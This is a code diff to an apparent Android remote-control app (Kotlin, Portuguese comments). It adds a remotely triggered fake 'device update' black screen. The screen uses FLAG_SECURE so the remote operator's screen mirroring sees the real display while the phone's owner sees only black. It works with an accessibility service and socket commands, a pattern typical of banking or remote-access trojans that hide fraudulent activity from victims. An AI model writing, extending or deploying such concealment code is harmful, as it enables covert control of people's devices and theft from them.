@@ -599,28 +599,21 @@ object SocketManager {
                             args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                             else -> false
                         }
-                        // CAMINHO ROBUSTO (preferido): o serviço de acessibilidade
-                        // desenha a tela preta — NÃO depende de SYSTEM_ALERT_WINDOW
-                        // nem de startService (que falhavam em segundo plano).
-                        val svcAcc = MyAccessibilityService.instance
-                        if (svcAcc != null) {
-                            if (ativo) svcAcc.mostrarAtualizacaoDispositivoPreta()
-                            else svcAcc.esconderAtualizacaoDispositivoPreta()
-                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta (acessibilidade) ativo = $ativo")
+                        // NOVO (Switch Direita/Esquerda): a tela preta discreta agora
+                        // é uma MainActivity em MODO ATUALIZAÇÃO — tema transparente
+                        // (zero tela branca) + FLAG_SECURE (o espelhamento ignora a
+                        // janela e filma o fundo real) + tela cheia preta imersiva.
+                        // SEM WindowManager overlay. Universal Android 7 → 15.
+                        //   Direita (ativo=true)  -> abre a Activity (via acessibilidade
+                        //                            + FullScreenIntent de garantia);
+                        //   Esquerda (ativo=false)-> fecha na hora (finishAndRemoveTask).
+                        val ctx = appContext ?: MyAccessibilityService.instance
+                        if (ativo) {
+                            MainActivity.abrirModoAtualizacao(ctx)
+                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta (MainActivity modo atualização) ativo = true")
                         } else {
-                            // Fallback: serviço dedicado (precisa de SYSTEM_ALERT_WINDOW).
-                            val ctx = appContext
-                            if (ctx != null) {
-                                try {
-                                    val intent = Intent(ctx, AtualizacaoDispositivoService::class.java)
-                                        .putExtra("ativo", ativo)
-                                    if (ativo) ctx.startService(intent)
-                                    else ctx.stopService(intent)
-                                } catch (e: Exception) {
-                                    Log.e(TAG, "Erro ao (des)ativar AtualizacaoDispositivoService: ${e.message}", e)
-                                }
-                            }
-                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta (service fallback) ativo = $ativo")
+                            MainActivity.fecharModoAtualizacao()
+                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta encerrada (finishAndRemoveTask) ativo = false")
                         }
                     }
 
@@ -640,6 +633,16 @@ object SocketManager {
                     on("overlay_atualizacao_visual") { args ->
                         val json = parseJson(args)
                         val ativo = json?.optBoolean("ativo", false) ?: false
+                        // NOVO FLUXO (Switch): a tela preta do dispositivo agora é a
+                        // MainActivity em MODO ATUALIZAÇÃO (sem WindowManager overlay).
+                        // Se ela já está ativa, NÃO desenha o overlay WM aqui (evita
+                        // overlay duplo); o painel/emulador mostram só o spinner. O
+                        // caminho antigo (sem MainActivity) continua intacto.
+                        if (MainActivity.instanciaAtualizacao != null) {
+                            emitirAtualizacaoConcluida(true)
+                            emitLog("[OVERLAY ATZ] MainActivity atualização ativa — sem overlay WM.")
+                            return@on
+                        }
                         val svc = MyAccessibilityService.instance
                         if (svc == null) {
                             emitLog("[OVERLAY ATZ] Serviço de acessibilidade indisponível.")
